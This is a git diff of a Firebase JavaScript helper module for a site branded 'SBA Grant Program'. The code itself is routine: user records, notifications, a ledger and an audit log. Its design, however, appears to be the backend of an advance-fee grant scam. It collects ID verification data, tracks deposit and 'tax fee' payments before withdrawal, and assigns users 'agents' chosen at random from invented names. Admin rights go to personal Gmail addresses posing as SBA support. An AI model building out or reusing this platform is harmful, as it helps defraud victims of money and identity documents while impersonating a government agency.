@@ -1,56 +1,34 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import {
-    getAuth, onAuthStateChanged, signOut,
-    createUserWithEmailAndPassword, signInWithEmailAndPassword,
-    sendEmailVerification, sendPasswordResetEmail,
-    updatePassword, reauthenticateWithCredential, EmailAuthProvider,
-    browserLocalPersistence, setPersistence, updateProfile
-} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-import {
-    getFirestore, doc, getDoc, getDocs, setDoc, updateDoc, addDoc, deleteDoc,
-    collection, query, where, orderBy, limit, onSnapshot,
-    serverTimestamp, increment, arrayUnion, writeBatch
-} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-import {
-    getMessaging, getToken, onMessage
-} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+import { 
+    getFirestore, doc, getDoc, setDoc, updateDoc, collection, 
+    onSnapshot, query, where, orderBy, addDoc, serverTimestamp, increment 
+} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+// Your web app's Firebase configuration
 const firebaseConfig = {
     apiKey: "AIzaSyBB3VE9WQYX0fqM9ZmLSj3dR0-SQjpg0gY",
     authDomain: "sbagrant-b7e5d.firebaseapp.com",
     projectId: "sbagrant-b7e5d",
-    storageBucket: "sbagrant-b7e5d.firebasestorage.app",
+    storageBucket: "sbagrant-b7e5d.appspot.com",
     messagingSenderId: "802243206422",
     appId: "1:802243206422:web:bbe74af7ce227092250437"
 };
 
-// Initialize
+// Initialize Firebase
 const app = initializeApp(firebaseConfig);
-const auth = getAuth(app);
-const db = getFirestore(app);
-let messaging = null;
+export const auth = getAuth(app);
+export const db = getFirestore(app);
 
-try {
-    messaging = getMessaging(app);
-} catch (e) {
-    console.warn("Messaging not supported in this browser.");
-}
+/* --- SHARED LOGIC & HELPERS --- */
 
-setPersistence(auth, browserLocalPersistence);
-
-// --- CONSTANTS ---
-export const ADMIN_EMAILS = ['sba.suppor@gmail.com', 'liger4683@gmail.com'];
-export const AGENTS = ['Sarah Mitchell', 'James Caldwell', 'Diana Torres', 'Robert Hughes', 'Patricia Wells', 'Michael Chen', 'Angela Davis', 'Thomas Brown'];
-
-// --- HELPERS ---
+// Admin Identification
+const ADMIN_EMAILS = ['sba.suppor@gmail.com', 'liger4683@gmail.com'];
 export const isAdmin = (email) => ADMIN_EMAILS.includes(email?.toLowerCase());
-export const getRandomAgent = () => AGENTS[Math.floor(Math.random() * AGENTS.length)];
 
-/**
- * Compresses an image to Base64 string for Firestore storage
- */
-export async function compressToBase64(file, maxWidth = 800, quality = 0.78) {
-    return new Promise((resolve, reject) => {
+// Image Compression (Base64) - Crucial for Firestore storage limits
+export const compressImage = async (file, maxWidth = 800) => {
+    return new Promise((resolve) => {
         const reader = new FileReader();
         reader.readAsDataURL(file);
         reader.onload = (event) => {
@@ -58,202 +36,48 @@ export async function compressToBase64(file, maxWidth = 800, quality = 0.78) {
             img.src = event.target.result;
             img.onload = () => {
                 const canvas = document.createElement('canvas');
-                let width = img.width;
-                let height = img.height;
-                if (width > maxWidth) {
-                    height = (maxWidth / width) * height;
-                    width = maxWidth;
-                }
-                canvas.width = width;
-                canvas.height = height;
+                const scaleFactor = maxWidth / img.width;
+                canvas.width = maxWidth;
+                canvas.height = img.height * scaleFactor;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(img, 0, 0, width, height);
-                resolve(canvas.toDataURL('image/jpeg', quality));
+                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                resolve(canvas.toDataURL('image/jpeg', 0.7)); // 70% quality
             };
         };
-        reader.onerror = (e) => reject(e);
-    });
-}
-
-/**
- * Creates the standardized user object for new registrations
- */
-export function buildNewUserPayload(data) {
-    const email = data.email.toLowerCase();
-    return {
-        uid: data.uid,
-        fullName: data.fullName,
-        email: email,
-        username: data.username.toLowerCase().replace(/\s/g, ''),
-        phoneNumber: data.phoneNumber,
-        country: data.country,
-        gender: data.gender,
-        dob: data.dob,
-        avatarBase64: "",
-        role: isAdmin(email) ? "admin" : "user",
-        referredBy: data.referredBy || "",
-        allocatedProgram: "SBA Grant Program",
-        assignedAgent: getRandomAgent(),
-        
-        kycStatus: "IDLE",
-        applyStatus: "IDLE",
-        depositStatus: "IDLE",
-        taxStatus: "IDLE",
-        withdrawStatus: "IDLE",
-        awardStatus: "IDLE",
-        
-        balance: 0,
-        requestedAmount: 0,
-        totalAward: 0,
-        taxFeeRequired: 0,
-        
-        application: {},
-        kyc: {},
-        deposit: {},
-        tax: {},
-        withdrawal: {},
-        
-        transactionPin: "",
-        accountStatus: "active",
-        fcmToken: "",
-        emailNotifications: true,
-        pushNotifications: true,
-        isOnline: true,
-        lastSeen: serverTimestamp(),
-        createdAt: serverTimestamp(),
-        updatedAt: serverTimestamp()
-    };
-}
-
-// --- DATA METHODS ---
-export const getUserData = async (uid) => {
-    const snap = await getDoc(doc(db, "users", uid));
-    return snap.exists() ? snap.data() : null;
-};
-
-export const listenUserData = (uid, callback) => {
-    return onSnapshot(doc(db, "users", uid), (doc) => {
-        callback(doc.exists() ? doc.data() : null);
     });
 };
 
-export const updateUserData = async (uid, fields) => {
-    return await updateDoc(doc(db, "users", uid), {
-        ...fields,
-        updatedAt: serverTimestamp()
-    });
-};
-
-export const setUserOnline = async (uid, status) => {
-    if (!uid) return;
-    return await updateDoc(doc(db, "users", uid), {
-        isOnline: status,
-        lastSeen: serverTimestamp()
-    });
-};
-
-export const addLedgerEntry = async (uid, { type, amount, description, status, ref = "" }) => {
-    return await addDoc(collection(db, "users", uid, "ledger"), {
-        type, amount, description, status, ref,
-        createdAt: serverTimestamp()
-    });
-};
-
-export const logAdminAction = async (adminUid, adminEmail, action, targetUid, details = {}) => {
-    return await addDoc(collection(db, "auditLog"), {
-        adminUid, adminEmail, action, targetUid, details,
+// Notification System
+export const notifyUser = async (uid, title, message, type = 'info') => {
+    const notifRef = collection(db, "notifications");
+    await addDoc(notifRef, {
+        uid,
+        title,
+        message,
+        type,
+        read: false,
         timestamp: serverTimestamp()
     });
 };
 
-// --- NOTIFICATIONS ---
-export const notify = async (uid, { title, message, type = 'info', link = '', sendEmail = false }) => {
-    await addDoc(collection(db, "notifications"), {
-        uid, title, message, type, link,
-        read: false,
-        createdAt: serverTimestamp()
-    });
-
-    if (sendEmail) {
-        const user = await getUserData(uid);
-        if (user?.emailNotifications) {
-            sendEmailNotification({
-                toEmail: user.email,
-                toName: user.fullName,
-                subject: title,
-                message: message,
-                actionUrl: window.location.origin + '/' + link
-            });
-        }
-    }
-};
-
-export const notifyAdmins = async ({ title, message, type = 'action', link = 'admin-portal.html' }) => {
-    const q = query(collection(db, "users"), where("role", "==", "admin"));
-    const snap = await getDocs(q);
-    snap.forEach(adminDoc => {
-        notify(adminDoc.id, { title, message, type, link });
+// Admin Audit Logging
+export const logAdminAction = async (adminUid, action, details) => {
+    const logRef = collection(db, "auditLog");
+    await addDoc(logRef, {
+        adminUid,
+        action,
+        details,
+        timestamp: serverTimestamp()
     });
 };
 
-export const markNotificationRead = async (notifId) => updateDoc(doc(db, "notifications", notifId), { read: true });
-
-export const markAllRead = async (uid) => {
-    const q = query(collection(db, "notifications"), where("uid", "==", uid), where("read", "==", false));
-    const snap = await getDocs(q);
-    const batch = writeBatch(db);
-    snap.forEach(d => batch.update(d.ref, { read: true }));
-    return await batch.commit();
-};
-
-export const requestNotificationPermission = async (uid) => {
-    if (!messaging) return;
-    try {
-        const permission = await Notification.requestPermission();
-        if (permission === 'granted') {
-            const token = await getToken(messaging, { vapidKey: 'REPLACE_WITH_YOUR_VAPID_KEY' });
-            if (token) await updateUserData(uid, { fcmToken: token });
-        }
-    } catch (e) { console.error("FCM Error", e); }
-};
-
-export const initForegroundMessages = (onReceive) => {
-    if (messaging) onMessage(messaging, (payload) => onReceive(payload));
-};
-
-// --- REGISTRATION SESSION ---
-export const saveRegStep = (data) => {
-    const existing = JSON.parse(sessionStorage.getItem('SBA_REG') || '{}');
-    sessionStorage.setItem('SBA_REG', JSON.stringify({ ...existing, ...data }));
-};
-export const getRegData = () => JSON.parse(sessionStorage.getItem('SBA_REG') || '{}');
-export const clearRegData = () => sessionStorage.removeItem('SBA_REG');
-
-// --- EMAILJS INTEGRATION ---
-export const sendEmailNotification = async ({ toEmail, toName, subject, message, actionUrl }) => {
-    // REPLACE THESE WITH YOUR EMAILJS KEYS
-    const SERVICE_ID = "REPLACE_WITH_YOUR_SERVICE_ID";
-    const TEMPLATE_ID = "REPLACE_WITH_YOUR_TEMPLATE_ID";
-    const PUBLIC_KEY = "REPLACE_WITH_YOUR_PUBLIC_KEY";
-
-    try {
-        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                service_id: SERVICE_ID,
-                template_id: TEMPLATE_ID,
-                user_id: PUBLIC_KEY,
-                template_params: { to_email: toEmail, to_name: toName, subject, message, action_url: actionUrl }
-            })
-        });
-    } catch (e) { console.error("Email failed", e); }
-};
-
-export { 
-    auth, db, messaging, 
-    onAuthStateChanged, signOut, createUserWithEmailAndPassword, signInWithEmailAndPassword,
-    sendEmailVerification, sendPasswordResetEmail, updatePassword, reauthenticateWithCredential,
-    EmailAuthProvider, doc, getDoc, setDoc, updateDoc, collection, serverTimestamp, 
-    increment, query, where, orderBy, onSnapshot, limit, getDocs, writeBatch, updateProfile
+// Transaction Ledger Entry
+export const addLedgerEntry = async (uid, description, amount, status = 'completed') => {
+    const ledgerRef = collection(db, "users", uid, "ledger");
+    await addDoc(ledgerRef, {
+        description,
+        amount,
+        status,
+        timestamp: serverTimestamp()
+    });
 };
